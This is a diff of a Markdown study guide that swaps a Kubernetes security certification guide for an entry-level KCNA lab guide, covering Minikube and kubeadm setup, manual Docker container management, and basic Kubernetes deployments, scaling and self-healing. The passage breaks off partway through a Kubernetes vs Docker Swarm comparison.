@@ -1,1729 +1,8875 @@
-# CKS Complete Master Guide
-## Certified Kubernetes Security Specialist - Full Lab Guide
+# KCNA Complete Master Guide
+## Kubernetes and Cloud Native Associate Certification Labs
 
 **Author:** Saleem Ali  
-**Certification:** CKS (Certified Kubernetes Security Specialist)  
-**Level:** Advanced | **Duration:** 2 hours | **Passing:** 67%  
+**Course:** AIOps - Al-Nafi International College  
+**Certification:** KCNA (Kubernetes and Cloud Native Associate)  
+**Level:** Entry-Level | **Duration:** 90 minutes | **Passing Score:** 75%  
 **GitHub:** https://github.com/ali4210  
 **LinkedIn:** https://www.linkedin.com/in/saleem-ali-189719325/
 
 ---
 
-## 🎯 About CKS
+## 🎯 About KCNA Certification
 
-**Certified Kubernetes Security Specialist** - Advanced security certification.
+The **Kubernetes and Cloud Native Associate (KCNA)** is an entry-level certification by the Cloud Native Computing Foundation (CNCF) that validates your understanding of Kubernetes and cloud-native technologies.
 
-**⚠️ PREREQUISITE: Valid CKA certification required!**
-
-**Exam:** Performance-based | 2 hours | 67% passing | $395 USD
-
----
-
-## 🖥️ Lab Environments
-
-### Minikube (Basic Security)
-Single-node for basic concepts
-
-### Kubeadm Multi-Node (⭐ REQUIRED FOR CKS!)
-```
-Master (Kali) + Workers (Parrot/Ubuntu)
-With: Calico, Falco, Trivy, AppArmor, Audit Logging
-```
-
-**CKS requires multi-node cluster security scenarios!**
+**Exam Format:**
+- 60 multiple-choice questions
+- 90 minutes duration
+- 75% passing score
+- Online proctored exam
+- $250 USD exam fee
+- 3-year validity
 
 ---
 
+## 🖥️ Lab Environment Options
 
-Lab 1: Securing Cluster Networking
+This guide supports **TWO** Kubernetes environments. Choose based on your learning goals:
+
+### Option 1: Minikube (Single-Node) - Recommended for Beginners
+
+```
+┌─────────────────────────────┐
+│    Your Machine             │
+│  (Kali Linux/Ubuntu)        │
+│                             │
+│  ┌───────────────────────┐  │
+│  │  Minikube Cluster     │  │
+│  │  Control Plane +      │  │
+│  │  Worker (All-in-One)  │  │
+│  └───────────────────────┘  │
+└─────────────────────────────┘
+```
+
+**Best For:** Quick setup, learning basics, testing, development
+
+### Option 2: Kubeadm Multi-Node - Production-Like Setup
+
+```
+┌─────────────────┐
+│  Master Node    │
+│  (Kali Linux)   │
+│  Control Plane  │
+└────────┬────────┘
+         │
+    ┌────┴────┬─────────┬──────────┐
+    │         │         │          │
+┌───▼───┐ ┌──▼───┐ ┌───▼────┐ ┌───▼────┐
+│Parrot │ │Parrot│ │ Ubuntu │ │ Parrot │
+│Worker │ │Worker│ │ Worker │ │ Worker │
+│ Node  │ │ Node │ │  Node  │ │  Node  │
+└───────┘ └──────┘ └────────┘ └────────┘
+```
+
+**Best For:** Real-world scenarios, distributed systems, production practice
+
+---
+
+## 📋 Table of Contents
+
+
+Lab 1: Exploring Container Orchestration
+Objectives
+
+By the end of this lab, students will be able to:
+
+• Understand the challenges of manually managing containerized applications • Deploy multiple containerized applications without orchestration tools • Identify and experience common issues such as port conflicts and resource management problems • Simulate scaling scenarios and observe manual intervention requirements • Analyze failure scenarios and recovery challenges in non-orchestrated environments • Explain how container orchestration platforms address these operational challenges • Compare manual container management with orchestrated solutions
+Prerequisites
+
+Before starting this lab, students should have:
+
+• Basic understanding of Linux command line operations • Fundamental knowledge of Docker containers and basic Docker commands • Understanding of networking concepts (ports, IP addresses) • Familiarity with text editors (nano, vim, or similar) • Basic knowledge of web applications and HTTP protocols
+Lab Environment Setup
+
+Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Docker already installed. Simply click Start Lab to access your environment - no need to build your own VM or install Docker manually.
+
+Your lab environment includes: • Ubuntu 20.04 LTS with Docker Engine installed • Pre-configured user with sudo privileges • Network access for downloading container images • Multiple terminal sessions available
+Task 1: Deploy Two Containerized Applications Manually
+Subtask 1.1: Verify Docker Installation and Prepare Environment
+
+First, let's verify that Docker is properly installed and running on your system.
+
+# Check Docker version
+docker --version
+
+# Check Docker service status
+sudo systemctl status docker
+
+# Verify Docker is running by listing containers
+docker ps
+
+Create a working directory for this lab:
+
+# Create lab directory
+mkdir ~/container-orchestration-lab
+cd ~/container-orchestration-lab
+
+# Create subdi
+
+---
+
+## 🔧 Environment Setup Instructions
+
+### Minikube Setup (Single-Node)
+
+**Prerequisites:**
+- 2 CPUs or more
+- 2GB+ free memory
+- 20GB+ free disk space
+- Docker or VirtualBox installed
+
+**Installation:**
+```bash
+# Install kubectl
+curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+chmod +x kubectl
+sudo mv kubectl /usr/local/bin/
+
+# Install Minikube
+curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
+sudo install minikube-linux-amd64 /usr/local/bin/minikube
+
+# Start Minikube
+minikube start --driver=docker --memory=2048 --cpus=2
+
+# Verify
+kubectl cluster-info
+kubectl get nodes
+```
+
+### Kubeadm Multi-Node Setup
+
+**On Master Node (Kali Linux):**
+```bash
+# Install container runtime (containerd)
+sudo apt-get update
+sudo apt-get install -y containerd
+
+# Configure containerd
+sudo mkdir -p /etc/containerd
+containerd config default | sudo tee /etc/containerd/config.toml
+sudo systemctl restart containerd
+
+# Install kubeadm, kubelet, kubectl
+sudo apt-get update
+sudo apt-get install -y apt-transport-https ca-certificates curl
+curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.28/deb/Release.key | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg
+echo 'deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.28/deb/ /' | sudo tee /etc/apt/sources.list.d/kubernetes.list
+sudo apt-get update
+sudo apt-get install -y kubelet kubeadm kubectl
+sudo apt-mark hold kubelet kubeadm kubectl
+
+# Initialize cluster
+sudo kubeadm init --pod-network-cidr=10.244.0.0/16
+
+# Configure kubectl for your user
+mkdir -p $HOME/.kube
+sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
+sudo chown $(id -u):$(id -g) $HOME/.kube/config
+
+# Install network plugin (Flannel)
+kubectl apply -f https://raw.githubusercontent.com/flannel-io/flannel/master/Documentation/kube-flannel.yml
+```
+
+**On Worker Nodes (Parrot/Ubuntu):**
+```bash
+# Install container runtime and kubernetes tools (same as master)
+# Then join the cluster using the command from kubeadm init output:
+sudo kubeadm join <master-ip>:6443 --token <token> \
+  --discovery-token-ca-cert-hash sha256:<hash>
+```
+
+**Verify Multi-Node Cluster:**
+```bash
+# On master node
+kubectl get nodes
+kubectl get pods -A
+```
+
+---
+
+
+Lab 1: Exploring Container Orchestration
+Objectives
+
+By the end of this lab, students will be able to:
+
+• Understand the challenges of manually managing containerized applications • Deploy multiple containerized applications without orchestration tools • Identify and experience common issues such as port conflicts and resource management problems • Simulate scaling scenarios and observe manual intervention requirements • Analyze failure scenarios and recovery challenges in non-orchestrated environments • Explain how container orchestration platforms address these operational challenges • Compare manual container management with orchestrated solutions
+Prerequisites
+
+Before starting this lab, students should have:
+
+• Basic understanding of Linux command line operations • Fundamental knowledge of Docker containers and basic Docker commands • Understanding of networking concepts (ports, IP addresses) • Familiarity with text editors (nano, vim, or similar) • Basic knowledge of web applications and HTTP protocols
+Lab Environment Setup
+
+Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Docker already installed. Simply click Start Lab to access your environment - no need to build your own VM or install Docker manually.
+
+Your lab environment includes: • Ubuntu 20.04 LTS with Docker Engine installed • Pre-configured user with sudo privileges • Network access for downloading container images • Multiple terminal sessions available
+Task 1: Deploy Two Containerized Applications Manually
+Subtask 1.1: Verify Docker Installation and Prepare Environment
+
+First, let's verify that Docker is properly installed and running on your system.
+
+# Check Docker version
+docker --version
+
+# Check Docker service status
+sudo systemctl status docker
+
+# Verify Docker is running by listing containers
+docker ps
+
+Create a working directory for this lab:
+
+# Create lab directory
+mkdir ~/container-orchestration-lab
+cd ~/container-orchestration-lab
+
+# Create subdirectories for our applications
+mkdir app1 app2
+
+Subtask 1.2: Deploy First Application - Web Server
+
+We'll deploy a simple nginx web server as our first application.
+
+# Pull nginx image
+docker pull nginx:latest
+
+# Run first nginx container on port 8080
+docker run -d \
+  --name web-app-1 \
+  -p 8080:80 \
+  nginx:latest
+
+# Verify the container is running
+docker ps
+
+# Test the application
+curl http://localhost:8080
+
+Create a custom HTML page for our first application:
+
+# Create custom HTML content
+cat > ~/container-orchestration-lab/app1/index.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Web Application 1</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #e3f2fd; text-align: center; padding: 50px; }
+        h1 { color: #1976d2; }
+    </style>
+</head>
+<body>
+    <h1>Welcome to Web Application 1</h1>
+    <p>This is running on port 8080</p>
+    <p>Container ID: <span id="hostname"></span></p>
+    <script>
+        document.getElementById('hostname').textContent = window.location.hostname;
+    </script>
+</body>
+</html>
+EOF
+
+# Copy custom content to running container
+docker cp ~/container-orchestration-lab/app1/index.html web-app-1:/usr/share/nginx/html/index.html
+
+# Verify custom content
+curl http://localhost:8080
+
+Subtask 1.3: Deploy Second Application - Another Web Server
+
+Now let's deploy a second web application and observe port conflict issues.
+
+# Attempt to run second nginx container on the same port (this will fail)
+docker run -d \
+  --name web-app-2 \
+  -p 8080:80 \
+  nginx:latest
+
+Expected Result: This command will fail with a port binding error. This demonstrates our first challenge - port conflicts.
+
+# Check the error message
+docker logs web-app-2
+
+# Run second container on a different port
+docker run -d \
+  --name web-app-2-fixed \
+  -p 8081:80 \
+  nginx:latest
+
+# Verify both containers are running
+docker ps
+
+Create custom content for the second application:
+
+# Create custom HTML for second app
+cat > ~/container-orchestration-lab/app2/index.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Web Application 2</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f3e5f5; text-align: center; padding: 50px; }
+        h1 { color: #7b1fa2; }
+    </style>
+</head>
+<body>
+    <h1>Welcome to Web Application 2</h1>
+    <p>This is running on port 8081</p>
+    <p>Container ID: <span id="hostname"></span></p>
+    <script>
+        document.getElementById('hostname').textContent = window.location.hostname;
+    </script>
+</body>
+</html>
+EOF
+
+# Copy custom content to second container
+docker cp ~/container-orchestration-lab/app2/index.html web-app-2-fixed:/usr/share/nginx/html/index.html
+
+# Test both applications
+echo "Testing Application 1:"
+curl http://localhost:8080
+echo -e "\nTesting Application 2:"
+curl http://localhost:8081
+
+Subtask 1.4: Analyze Resource Management Challenges
+
+Let's examine resource usage and management challenges.
+
+# Check resource usage of containers
+docker stats --no-stream
+
+# Check detailed container information
+docker inspect web-app-1 | grep -A 10 "Memory"
+docker inspect web-app-2-fixed | grep -A 10 "Memory"
+
+# Run containers with resource limits
+docker run -d \
+  --name web-app-3-limited \
+  --memory="128m" \
+  --cpus="0.5" \
+  -p 8082:80 \
+  nginx:latest
+
+# Compare resource usage
+docker stats --no-stream web-app-1 web-app-2-fixed web-app-3-limited
+
+Create a script to monitor resource usage:
+
+# Create monitoring script
+cat > ~/container-orchestration-lab/monitor.sh << 'EOF'
+#!/bin/bash
+echo "Container Resource Monitoring"
+echo "============================="
+while true; do
+    clear
+    echo "$(date)"
+    echo "Container Status:"
+    docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
+    echo ""
+    echo "Resource Usage:"
+    docker stats --no-stream --format "table {{.Name}}\t{{.CPUPerc}}\t{{.MemUsage}}\t{{.NetIO}}"
+    echo ""
+    echo "Press Ctrl+C to stop monitoring"
+    sleep 5
+done
+EOF
+
+# Make script executable
+chmod +x ~/container-orchestration-lab/monitor.sh
+
+# Run monitoring script (let it run for 30 seconds, then stop with Ctrl+C)
+./monitor.sh
+
+Task 2: Simulate Scaling and Failure Scenarios
+Subtask 2.1: Manual Scaling Challenges
+
+Let's simulate the need to scale our applications and observe the manual effort required.
+
+# Create a script to deploy multiple instances manually
+cat > ~/container-orchestration-lab/scale-app.sh << 'EOF'
+#!/bin/bash
+
+APP_NAME="web-app"
+BASE_PORT=9000
+INSTANCES=5
+
+echo "Manually scaling $APP_NAME to $INSTANCES instances..."
+
+for i in $(seq 1 $INSTANCES); do
+    PORT=$((BASE_PORT + i))
+    CONTAINER_NAME="${APP_NAME}-instance-${i}"
+    
+    echo "Deploying $CONTAINER_NAME on port $PORT"
+    
+    docker run -d \
+      --name $CONTAINER_NAME \
+      -p $PORT:80 \
+      nginx:latest
+    
+    if [ $? -eq 0 ]; then
+        echo "✓ Successfully deployed $CONTAINER_NAME"
+    else
+        echo "✗ Failed to deploy $CONTAINER_NAME"
+    fi
+    
+    sleep 2
+done
+
+echo "Scaling complete. Checking status..."
+docker ps | grep web-app-instance
+EOF
+
+# Make script executable and run it
+chmod +x ~/container-orchestration-lab/scale-app.sh
+./scale-app.sh
+
+Now let's test all our scaled instances:
+
+# Create a script to test all instances
+cat > ~/container-orchestration-lab/test-instances.sh << 'EOF'
+#!/bin/bash
+
+echo "Testing all application instances..."
+echo "=================================="
+
+for port in {9001..9005}; do
+    echo "Testing instance on port $port:"
+    response=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:$port)
+    if [ $response -eq 200 ]; then
+        echo "✓ Port $port: OK"
+    else
+        echo "✗ Port $port: Failed (HTTP $response)"
+    fi
+done
+EOF
+
+chmod +x ~/container-orchestration-lab/test-instances.sh
+./test-instances.sh
+
+Subtask 2.2: Simulate Container Failures
+
+Let's simulate container failures and observe the manual recovery process.
+
+# Stop a few containers to simulate failures
+echo "Simulating container failures..."
+docker stop web-app-instance-2 web-app-instance-4
+
+# Check which containers are still running
+docker ps | grep web-app-instance
+
+# Test instances again to see failures
+./test-instances.sh
+
+# Manual recovery process
+echo "Manual recovery process:"
+echo "1. Identify failed containers"
+docker ps -a | grep web-app-instance | grep Exited
+
+echo "2. Restart failed containers manually"
+docker start web-app-instance-2
+docker start web-app-instance-4
+
+echo "3. Verify recovery"
+./test-instances.sh
+
+Subtask 2.3: Load Balancing Challenges
+
+Without orchestration, load balancing requires manual configuration. Let's explore this challenge.
+
+# Install nginx for load balancing (if not already available)
+sudo apt-get update
+sudo apt-get install -y nginx
+
+# Create nginx load balancer configuration
+sudo tee /etc/nginx/sites-available/load-balancer << 'EOF'
+upstream backend {
+    server localhost:9001;
+    server localhost:9002;
+    server localhost:9003;
+    server localhost:9004;
+    server localhost:9005;
+}
+
+server {
+    listen 80;
+    server_name localhost;
+
+    location / {
+        proxy_pass http://backend;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
+}
+EOF
+
+# Enable the configuration
+sudo ln -sf /etc/nginx/sites-available/load-balancer /etc/nginx/sites-enabled/
+sudo rm -f /etc/nginx/sites-enabled/default
+
+# Test nginx configuration
+sudo nginx -t
+
+# Restart nginx
+sudo systemctl restart nginx
+
+# Test load balancing
+echo "Testing load balancer:"
+for i in {1..10}; do
+    echo "Request $i:"
+    curl -s http://localhost | grep -o "Welcome to.*" || echo "Failed"
+    sleep 1
+done
+
+Task 3: Document and Analyze Challenges
+Subtask 3.1: Create Challenge Documentation
+
+Let's document all the challenges we've encountered:
+
+# Create comprehensive challenge report
+cat > ~/container-orchestration-lab/challenges-report.md << 'EOF'
+# Container Management Challenges Report
+
+## 1. Port Conflicts
+- **Issue**: Multiple containers cannot bind to the same port
+- **Manual Solution**: Track and assign unique ports for each container
+- **Complexity**: Increases with number of applications and instances
+
+## 2. Resource Management
+- **Issue**: No automatic resource allocation or limits
+- **Manual Solution**: Manually set memory and CPU limits for each container
+- **Risk**: Resource contention and system instability
+
+## 3. Scaling Challenges
+- **Issue**: Manual deployment of multiple instances
+- **Time Consuming**: Each instance requires individual commands
+- **Error Prone**: High chance of configuration mistakes
+
+## 4. Failure Recovery
+- **Issue**: No automatic restart of failed containers
+- **Manual Process**: Constant monitoring and manual intervention required
+- **Downtime**: Extended service interruption during manual recovery
+
+## 5. Load Balancing
+- **Issue**: No built-in load distribution
+- **Manual Setup**: Requires separate load balancer configuration
+- **Maintenance**: Manual updates when instances change
+
+## 6. Service Discovery
+- **Issue**: Hard-coded IP addresses and ports
+- **Brittle**: Configuration breaks when containers restart with new IPs
+- **Scalability**: Difficult to manage as system grows
+
+## 7. Configuration Management
+- **Issue**: No centralized configuration management
+- **Inconsistency**: Different configurations across instances
+- **Updates**: Manual updates to each container individually
+EOF
+
+# Display the report
+cat ~/container-orchestration-lab/challenges-report.md
+
+Subtask 3.2: Performance Impact Analysis
+
+Let's measure the performance impact of our manual setup:
+
+# Create performance testing script
+cat > ~/container-orchestration-lab/performance-test.sh << 'EOF'
+#!/bin/bash
+
+echo "Performance Impact Analysis"
+echo "=========================="
+
+# Test response times
+echo "1. Response Time Analysis:"
+for port in {9001..9005}; do
+    echo "Testing port $port:"
+    time curl -s http://localhost:$port > /dev/null
+done
+
+# Test concurrent requests
+echo -e "\n2. Concurrent Request Handling:"
+echo "Sending 50 concurrent requests to load balancer..."
+time for i in {1..50}; do
+    curl -s http://localhost > /dev/null &
+done
+wait
+
+# Resource utilization during load
+echo -e "\n3. Resource Utilization:"
+docker stats --no-stream | grep web-app-instance
+EOF
+
+chmod +x ~/container-orchestration-lab/performance-test.sh
+./performance-test.sh
+
+Task 4: Demonstrate Orchestration Benefits
+Subtask 4.1: Compare with Orchestration Concepts
+
+Let's create a comparison document showing how orchestration would solve our challenges:
+
+# Create orchestration benefits comparison
+cat > ~/container-orchestration-lab/orchestration-benefits.md << 'EOF'
+# Container Orchestration Benefits
+
+## How Orchestration Solves Our Challenges
+
+### 1. Automatic Port Management
+- **Orchestration Solution**: Service mesh and automatic port allocation
+- **Benefit**: No manual port conflict resolution needed
+- **Example**: Kubernetes Services abstract port management
+
+### 2. Resource Management
+- **Orchestration Solution**: Resource quotas and automatic scaling
+- **Benefit**: Automatic resource allocation based on demand
+- **Example**: Kubernetes ResourceQuotas and HorizontalPodAutoscaler
+
+### 3. Scaling
+- **Orchestration Solution**: Declarative scaling with single commands
+- **Benefit**: Scale from 1 to 100 instances with one command
+- **Example**: `kubectl scale deployment myapp --replicas=10`
+
+### 4. Self-Healing
+- **Orchestration Solution**: Automatic failure detection and recovery
+- **Benefit**: Zero-downtime automatic restart of failed containers
+- **Example**: Kubernetes ReplicaSets ensure desired state
+
+### 5. Load Balancing
+- **Orchestration Solution**: Built-in service discovery and load balancing
+- **Benefit**: Automatic traffic distribution without manual configuration
+- **Example**: Kubernetes Services provide automatic load balancing
+
+### 6. Service Discovery
+- **Orchestration Solution**: DNS-based service discovery
+- **Benefit**: Services find each other automatically by name
+- **Example**: Kubernetes DNS allows services to communicate by name
+
+### 7. Configuration Management
+- **Orchestration Solution**: ConfigMaps and Secrets
+- **Benefit**: Centralized configuration management
+- **Example**: Update configuration once, applies to all instances
+
+## Orchestration Platforms Comparison
+
+| Feature | Manual Management | Docker Swarm | Kubernetes |
+|---------|------------------|--------------|------------|
+| Scaling | Manual scripts | `docker service scale` | `kubectl scale` |
+| Load Balancing | External setup | Built-in | Built-in |
+| Self-Healing | Manual restart | Automatic | Automatic |
+| Rolling Updates | Manual process | `docker service update` | `kubectl rollout` |
+| Service Discovery | Hard-coded IPs | Built-in | DNS-based |
+| Configuration | Individual setup | Docker configs | ConfigMaps/Secrets |
+EOF
+
+cat ~/container-orchestration-lab/orchestration-benefits.md
+
+Subtask 4.2: Cleanup and Resource Management
+
+Let's clean up our manual deployment and observe the effort required:
+
+# Create cleanup script
+cat > ~/container-orchestration-lab/cleanup.sh << 'EOF'
+#!/bin/bash
+
+echo "Manual Cleanup Process"
+echo "====================="
+
+# Stop all web-app containers
+echo "1. Stopping all application containers..."
+docker ps | grep web-app | awk '{print $1}' | xargs -r docker stop
+
+# Remove all web-app containers
+echo "2. Removing all application containers..."
+docker ps -a | grep web-app | awk '{print $1}' | xargs -r docker rm
+
+# Remove unused images (optional)
+echo "3. Cleaning up unused images..."
+docker image prune -f
+
+# Stop nginx load balancer
+echo "4. Stopping load balancer..."
+sudo systemctl stop nginx
+
+# Show remaining containers
+echo "5. Remaining containers:"
+docker ps
+
+echo "Cleanup complete!"
+echo "Note: In orchestration, this would be: 'kubectl delete deployment myapp'"
+EOF
+
+chmod +x ~/container-orchestration-lab/cleanup.sh
+./cleanup.sh
+
+Troubleshooting Common Issues
+Issue 1: Port Already in Use
+
+# Check what's using a port
+sudo netstat -tulpn | grep :8080
+
+# Kill process using port (if needed)
+sudo fuser -k 8080/tcp
+
+Issue 2: Docker Service Not Running
+
+# Start Docker service
+sudo systemctl start docker
+
+# Enable Docker to start on boot
+sudo systemctl enable docker
+
+Issue 3: Permission Denied
+
+# Add user to docker group
+sudo usermod -aG docker $USER
+
+# Logout and login again, or use:
+newgrp docker
+
+Issue 4: Container Won't Start
+
+# Check container logs
+docker logs <container-name>
+
+# Check container configuration
+docker inspect <container-name>
+
+Conclusion
+
+In this lab, you have successfully:
+
+• Experienced Manual Container Management: You deployed multiple containerized applications manually and encountered real-world challenges including port conflicts, resource management issues, and scaling difficulties.
+
+• Identified Operational Challenges: Through hands-on experience, you discovered the complexity of managing containers without orchestration, including the need for manual intervention in failure scenarios and the time-consuming nature of scaling operations.
+
+• Analyzed Performance Impact: You measured the performance implications of manual container management and documented the operational overhead required to maintain multiple container instances.
+
+• Understood Orchestration Value: By comparing manual processes with orchestration capabilities, you now understand why container orchestration platforms like Kubernetes, Docker Swarm, and others are essential for production environments.
+Key Takeaways
+
+Manual Management Challenges:
+
+    Port conflicts require careful planning and tracking
+    Resource management needs constant monitoring
+    Scaling is time-consuming and error-prone
+    Failure recovery requires 24/7 monitoring
+    Load balancing needs separate infrastructure
+    Configuration management becomes complex at scale
+
+Orchestration Benefits:
+
+    Automatic port and resource management
+    Declarative scaling with single commands
+    Self-healing capabilities with zero-downtime recovery
+    Built-in load balancing and service discovery
+    Centralized configuration management
+    Simplified deployment and update processes
+
+Why This Matters
+
+Container orchestration is not just a convenience—it's a necessity for production environments. As you've experienced firsthand, managing even a few containers manually becomes complex quickly. In real-world scenarios with hundreds or thousands of containers, manual management is simply impossible.
+
+This lab has prepared you for understanding container orchestration platforms by giving you practical experience with the problems they solve. You're now ready to appreciate the value that platforms like Kubernetes bring to modern application deployment and management.
+
+The challenges you've encountered and documented in this lab directly relate to the Kubernetes and Cloud Native Associate (KCNA) certification objectives, particularly in understanding the problems that cloud-native technologies solve and the benefits of container orchestration in production environments.
+Lab Terminal
+Instructions
+
+
+
+Lab 2: Introduction to Kubernetes
+Objectives
+
+By the end of this lab, students will be able to:
+
+• Install and configure Minikube for local Kubernetes development • Deploy a simple web application to a Kubernetes cluster • Understand core Kubernetes concepts including pods, deployments, and services • Demonstrate Kubernetes scaling capabilities by manually scaling applications • Explore Kubernetes self-healing features through pod failure simulation • Compare Kubernetes orchestration capabilities with Docker Swarm • Navigate the Kubernetes command-line interface (kubectl) effectively
+Prerequisites
+
+Before starting this lab, students should have:
+
+• Basic understanding of containerization concepts and Docker • Familiarity with Linux command-line operations • Knowledge of YAML file structure and syntax • Understanding of basic networking concepts (ports, IP addresses) • Experience with text editors (nano, vim, or similar)
+Lab Environment Setup
+
+Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines for this lab. Simply click Start Lab to access your dedicated environment. No need to build your own virtual machine or install additional software on your local computer.
+
+Your cloud machine comes with: • Ubuntu 20.04 LTS operating system • Docker pre-installed and configured • Internet connectivity for downloading required packages • Administrative privileges for system configuration
+Task 1: Install Kubernetes Using Minikube
+Subtask 1.1: Update System and Install Dependencies
+
+First, ensure your system is up-to-date and install necessary dependencies.
+
+# Update package repository
+sudo apt update && sudo apt upgrade -y
+
+# Install curl and wget for downloading packages
+sudo apt install -y curl wget apt-transport-https
+
+# Install VirtualBox (required for Minikube)
+sudo apt install -y virtualbox virtualbox-ext-pack
+
+Subtask 1.2: Install kubectl
+
+kubectl is the command-line tool for interacting with Kubernetes clusters.
+
+# Download the latest kubectl binary
+curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+
+# Make kubectl executable
+chmod +x kubectl
+
+# Move kubectl to system PATH
+sudo mv kubectl /usr/local/bin/
+
+# Verify kubectl installation
+kubectl version --client
+
+Subtask 1.3: Install Minikube
+
+Minikube creates a local Kubernetes cluster for development and testing purposes.
+
+# Download Minikube binary
+curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
+
+# Install Minikube
+sudo install minikube-linux-amd64 /usr/local/bin/minikube
+
+# Verify Minikube installation
+minikube version
+
+Subtask 1.4: Start Minikube Cluster
+
+# Start Minikube with VirtualBox driver
+minikube start --driver=virtualbox --memory=2048 --cpus=2
+
+# Verify cluster status
+minikube status
+
+# Check cluster information
+kubectl cluster-info
+
+# View cluster nodes
+kubectl get nodes
+
+Expected Output: You should see one node in Ready status, indicating your Kubernetes cluster is operational.
+Task 2: Deploy a Simple Application in Kubernetes
+Subtask 2.1: Create Application Deployment
+
+We'll deploy an nginx web server as our sample application.
+
+# Create a deployment using nginx image
+kubectl create deployment nginx-app --image=nginx:latest
+
+# Verify deployment creation
+kubectl get deployments
+
+# Check pods created by the deployment
+kubectl get pods
+
+# Get detailed information about the deployment
+kubectl describe deployment nginx-app
+
+Subtask 2.2: Create Application Manifest Files
+
+Create YAML files for better configuration management.
+
+# Create a directory for Kubernetes manifests
+mkdir ~/k8s-lab
+cd ~/k8s-lab
+
+# Create deployment manifest file
+cat > nginx-deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: nginx-deployment
+  labels:
+    app: nginx
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: nginx
+  template:
+    metadata:
+      labels:
+        app: nginx
+    spec:
+      containers:
+      - name: nginx
+        image: nginx:1.21
+        ports:
+        - containerPort: 80
+        resources:
+          requests:
+            memory: "64Mi"
+            cpu: "250m"
+          limits:
+            memory: "128Mi"
+            cpu: "500m"
+EOF
+
+Subtask 2.3: Apply Deployment Configuration
+
+# Apply the deployment configuration
+kubectl apply -f nginx-deployment.yaml
+
+# Verify the deployment
+kubectl get deployments
+kubectl get pods -l app=nginx
+
+# Check pod details
+kubectl describe pods -l app=nginx
+
+Subtask 2.4: Expose Application with Service
+
+Create a service to make the application accessible.
+
+# Create service manifest file
+cat > nginx-service.yaml << 'EOF'
+apiVersion: v1
+kind: Service
+metadata:
+  name: nginx-service
+spec:
+  selector:
+    app: nginx
+  ports:
+    - protocol: TCP
+      port: 80
+      targetPort: 80
+  type: NodePort
+EOF
+
+# Apply the service configuration
+kubectl apply -f nginx-service.yaml
+
+# Verify service creation
+kubectl get services
+
+# Get service details
+kubectl describe service nginx-service
+
+Subtask 2.5: Access the Application
+
+# Get Minikube IP address
+minikube ip
+
+# Get service URL
+minikube service nginx-service --url
+
+# Test application accessibility
+curl $(minikube service nginx-service --url)
+
+Expected Output: You should see the default nginx welcome page HTML content.
+Task 3: Explore Kubernetes Key Features
+Subtask 3.1: Demonstrate Scaling Capabilities
+
+Horizontal scaling allows you to increase or decrease the number of application instances.
+
+# Check current number of replicas
+kubectl get deployments nginx-deployment
+
+# Scale up to 5 replicas
+kubectl scale deployment nginx-deployment --replicas=5
+
+# Verify scaling operation
+kubectl get pods -l app=nginx
+
+# Watch pods being created in real-time
+kubectl get pods -l app=nginx -w
+
+Press Ctrl+C to stop watching.
+
+# Scale down to 2 replicas
+kubectl scale deployment nginx-deployment --replicas=2
+
+# Verify scale-down operation
+kubectl get pods -l app=nginx
+
+# Check deployment status
+kubectl get deployments nginx-deployment
+
+Subtask 3.2: Explore Self-Healing Capabilities
+
+Kubernetes automatically restarts failed containers and replaces unhealthy pods.
+
+# List current pods with their names
+kubectl get pods -l app=nginx -o wide
+
+# Delete one pod to simulate failure
+POD_NAME=$(kubectl get pods -l app=nginx -o jsonpath='{.items[0].metadata.name}')
+kubectl delete pod $POD_NAME
+
+# Immediately check pod status
+kubectl get pods -l app=nginx
+
+# Watch Kubernetes create a replacement pod
+kubectl get pods -l app=nginx -w
+
+Press Ctrl+C to stop watching.
+
+Key Observation: Notice how Kubernetes immediately creates a new pod to maintain the desired replica count.
+Subtask 3.3: Explore Pod Logs and Debugging
+
+# View logs from nginx pods
+kubectl logs -l app=nginx
+
+# Get logs from a specific pod
+POD_NAME=$(kubectl get pods -l app=nginx -o jsonpath='{.items[0].metadata.name}')
+kubectl logs $POD_NAME
+
+# Execute commands inside a pod
+kubectl exec -it $POD_NAME -- /bin/bash
+
+# Inside the pod, check nginx status
+nginx -t
+exit
+
+Subtask 3.4: Resource Monitoring
+
+# Check resource usage of nodes
+kubectl top nodes
+
+# Check resource usage of pods
+kubectl top pods
+
+# Get detailed resource information
+kubectl describe nodes minikube
+
+Task 4: Compare Kubernetes with Docker Swarm
+Subtask 4.1: Create Comparison Analysis
+
+Create a comparison document to understand the differences between orchestration tools.
+
+# Create comparison file
+cat > orchestration-comparison.md << 'EOF'
+# Kubernetes vs Docker Swarm Comparison
+
+## Architecture
+**Kubernetes:**
+- Master-worker architecture with multiple components
+- etcd for distributed storage
+- Complex but highly scalable
+
+**Docker Swarm:**
+- Simpler architecture integrated with Docker Engine
+- Built-in distributed storage
+- Easier to set up but less feature-rich
+
+## Learning Curve
+**Kubernetes:**
+- Steeper learning curve
+- More concepts to understand (pods, deployments, services, etc.)
+- Extensive documentation and community support
+
+**Docker Swarm:**
+- Gentler learning curve
+- Familiar Docker commands
+- Limited advanced features
+
+## Scaling Capabilities
+**Kubernetes:**
+- Horizontal Pod Autoscaler (HPA)
+- Vertical Pod Autoscaler (VPA)
+- Custom metrics scaling
+- Advanced scheduling
+
